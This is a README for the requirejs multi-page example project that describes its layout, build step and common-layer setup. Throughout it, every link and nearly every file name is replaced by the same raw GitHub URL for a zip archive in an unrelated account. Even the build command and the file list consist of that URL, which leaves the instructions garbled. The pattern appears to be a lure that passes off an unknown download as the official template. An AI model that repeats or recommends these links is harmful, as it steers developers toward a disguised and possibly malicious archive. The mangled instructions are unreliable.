# requirejs/example-multipage

This project shows how to set up a multi-page requirejs-based project that has
the following goals:

* Each page uses a mix of common and page-specific modules.
* All pages share the same requirejs config.
* After an optimization build, the common items should be in a shared common
layer, and the page-specific modules should be in a page-specific layer.
* The HTML page should not have to be changed after doing the build.

**If you want to use [shim config](https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip)**, for instance to load Backbone, see
the [requirejs/example-multipage-shim](https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip)
example instead. This project will not work well with shim config. This project works
best when all the dependencies are AMD modules.

## Getting this project template

If you are using [volo](https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip):

    volo create projectname requirejs/example-multipage

Otherwise,
[download latest zipball of master](https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip).

## Project layout

This project has the following layout:

* **tools**: The requirejs optimizer, **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**, and the optimizer config,
**https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**
* **www**: The code that runs in the browser while in development mode.
* **www-built**: Generated after an optimizer build. Contains the built code
that can be deployed to the live site.

This **www** has the following layout:


* **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**: page 1 of the app.
* **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**: page 2 of the app.
* **js**
    * **app**: the directory to store app-specific modules.
    * **lib**: the directory to hold third party modules, like jQuery.
    * **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**: contains the requirejs config, and it will be the build
    target for the set of common modules.
    * **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**: used for the data-main for https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip Loads the common
    module, then loads **app/main1**, the main module for page 1.
    * **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**: used for the data-main for https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip Loads the common
    module, then loads **app/main2**, the main module for page 2.

To optimize, run:

    node https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip -o https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip

That build command creates an optimized version of the project in a
**www-built** directory. The **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip** file will contain all the common
modules. **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip** will contain the page1-specific modules,
**https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip** will contain the page2-specific modules.

## Building up the common layer

As you do builds and see in the build output that each page is including the
same module, add it to common's "include" array in **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**.

It is better to add these common modules to the **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip** config
instead of doing a require([]) call for them in **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**. Modules that
are not explicitly required at runtime are not executed when added to https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip
via the include build option. So by using **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**, you can include
common modules that may be in 2-3 pages but not all pages. For pages that do
not need a particular common module, it will not be executed. If you put in a
require() call for it in **https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip**, then it will always be executed.

## More info

For more information on the optimizer:
https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip

For more information on using requirejs:
https://raw.githubusercontent.com/alssalimi/example-multipage/master/www/js/multipage_example_2.2.zip
